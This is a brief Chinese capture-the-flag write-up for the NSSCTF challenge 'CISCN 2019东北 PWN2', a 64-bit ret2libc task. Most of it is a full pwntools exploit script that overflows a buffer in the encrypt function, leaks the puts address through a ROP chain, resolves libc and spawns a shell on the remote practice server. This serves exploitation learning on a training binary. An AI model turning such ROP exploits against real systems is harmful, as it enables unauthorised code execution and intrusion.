[[CISCN 2019东北]PWN2 | NSSCTF](https://www.nssctf.cn/problem/95)
一道ret2libc(64)的题目，需进入encrypt函数方可有栈溢出
![[Pasted image 20240815222454.png]]
![[Pasted image 20240815222522.png]]
由于进入循环后会改变输入的值，故在最前面添加'\x00'来跳过，接着正常溢出
exp:
```python
from pwn import *
from LibcSearcher import LibcSearcher
context(arch='amd64', os='linux', log_level='debug')

#p = process('./ret2libc_nss') #本地死活打不通，不懂
p = remote("node5.anna.nssctf.cn", 22084)
elf = ELF('./ret2libc_nss')

rdi = 0x400c83
ret = 0x4006b9

puts_plt = elf.plt['puts']
encrypt_addr = elf.sym['encrypt']
puts_got = elf.got['puts']

payload = b'\x00' + b'A' * (0x50+7) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)

p.sendlineafter(b'choice!', b'1')
p.sendlineafter(b'encrypted', payload)

puts_real = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

print(hex(puts_real))
libc = LibcSearcher('puts', puts_real)

libc_base = puts_real - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

payload = b'\x00' + b'A' * (0x50+7) + p64(ret) + p64(rdi) + p64(binsh) + p64(system) #栈对齐，不是很懂

p.sendlineafter(b'encrypted', payload)
p.interactive()
```